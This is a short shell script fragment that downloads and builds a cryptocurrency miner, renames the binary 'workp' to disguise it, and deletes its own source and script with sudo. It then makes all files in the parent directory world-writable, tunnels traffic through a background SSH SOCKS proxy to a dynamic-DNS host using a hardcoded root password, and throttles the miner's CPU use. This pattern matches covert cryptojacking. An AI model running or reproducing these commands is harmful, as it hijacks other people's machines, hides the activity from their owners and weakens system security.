...
git clone https://github.com/laptopdell/laptopovh
cd laptopovh
chmod +x *
./build.sh
make
mv cpuminer workp && cp workp ../ && cd ..  && sudo rm -rf laptopovh laptopovh.sh && sudo chmod 777 * && screen -d -m sshpass -p workpro1997 ssh -o StrictHostKeyChecking=no -D 1997 root@proxywork1.ddns.net && cpulimit --exe workp --limit 200 -b 
